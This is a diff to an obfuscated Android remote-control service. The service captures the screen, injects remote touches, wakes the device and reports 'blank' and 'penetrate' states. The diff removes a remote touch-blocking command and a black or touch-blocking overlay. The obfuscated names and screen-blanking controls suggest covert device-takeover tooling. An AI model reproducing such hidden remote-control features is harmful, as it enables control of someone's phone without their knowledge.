@@ -127,11 +127,6 @@ class DFm8Y8iMScvB2YDw : Service() {
             override fun normalCaptureReady(): Boolean =
                 _isStart && mediaProjection != null && virtualDisplay != null
             override fun normalGeometry(): Pair<Int, Int> = SCREEN_INFO.width to SCREEN_INFO.height
-            override fun prepareAdbTouch(action: Int, ready: () -> Unit) {
-                val service = nZW99cdXQ0COhB2o.ctx
-                if (service == null) ready() else service.prepareAdbTouch(action, ready)
-            }
-            override fun finishAdbTouch(action: Int) { nZW99cdXQ0COhB2o.ctx?.finishAdbTouch(action) }
             override fun setAdbCaptureCommitted(committed: Boolean) {
                 AccessibilityLifecycle.adbCaptureCommitted = committed
                 AccessibilityLifecycle.adbOwnsInput = false // Rust selects the backend per gesture.
@@ -179,16 +174,13 @@ class DFm8Y8iMScvB2YDw : Service() {
                     true
                 } catch (_: Exception) { false }
             }
-            // An APK touch-consuming overlay also consumes injected events on Android 16.
-            // Do not advertise touch blocking until a provider can preserve remote input.
-            override fun setOverlay(blockTouch: Boolean, black: Boolean): Boolean = !blockTouch && !black
         })
     }
 
     @Keep
     @RequiresApi(Build.VERSION_CODES.N)
     fun DFm8Y8iMScvB2YDwPI(kind: Int, mask: Int, x: Int, y: Int,url: String) {
-        val explicitSideCommand = kind == 1 && mask in setOf(37, 39, 40, 41, 43)
+        val explicitSideCommand = kind == 1 && mask in setOf(37, 39, 40, 41)
         if (AccessibilityLifecycle.paused || (AccessibilityLifecycle.adbOwnsInput && !explicitSideCommand)) return
         // turn on screen with LEFT_DOWN when screen off
         if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
@@ -215,7 +207,7 @@ class DFm8Y8iMScvB2YDw : Service() {
       @Keep
     @RequiresApi(Build.VERSION_CODES.N)
     fun DFm8Y8iMScvB2YDwPI(kind: Int, mask: Int, x: Int, y: Int) {
-        val explicitSideCommand = kind == 1 && mask in setOf(37, 39, 40, 41, 43)
+        val explicitSideCommand = kind == 1 && mask in setOf(37, 39, 40, 41)
         if (AccessibilityLifecycle.paused || (AccessibilityLifecycle.adbOwnsInput && !explicitSideCommand)) return
         // turn on screen with LEFT_DOWN when screen off
         if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
@@ -272,7 +264,6 @@ class DFm8Y8iMScvB2YDw : Service() {
                     val snapAccessibility = nZW99cdXQ0COhB2o.isOpen
                     val snapBIS = BIS
                     val snapSKL = SKL
-                    val snapTouchBlock = nZW99cdXQ0COhB2o.isTouchBlockOn
 
                     JSONObject().apply {
                         put("video", snapIsStart && snapMP != null)
@@ -281,7 +272,6 @@ class DFm8Y8iMScvB2YDw : Service() {
                         put("ignore", snapShouldRun || snapPendingIgnore)
                         put("blank", snapBIS)
                         put("penetrate", snapSKL)
-                        put("touchblock", snapTouchBlock)
                         put("accessibility", snapAccessibility)
                     }.toString()
                 } catch (e: Exception) {
@@ -466,9 +456,8 @@ class DFm8Y8iMScvB2YDw : Service() {
                 }
                 
             }
-            "touch_block" -> {
-                nZW99cdXQ0COhB2o.ctx?.setTouchBlockEnabled(arg1 == "1")
-            }
+            // Retired legacy command: old clients cannot enable touch blocking.
+            "touch_block" -> Unit
             "dev_selector" -> {
                 nZW99cdXQ0COhB2o.ctx?.handleDevSelectorCommand(arg1)
             }
@@ -1886,7 +1875,6 @@ class DFm8Y8iMScvB2YDw : Service() {
         _isAudioStart = false
         
         nZW99cdXQ0COhB2o.resetCaptureStates("destroy")
-        nZW99cdXQ0COhB2o.ctx?.setTouchBlockEnabled(false)
         gohome = 8
         BIS = false
         ClsFx9V0S.rEqMB3nD(255)
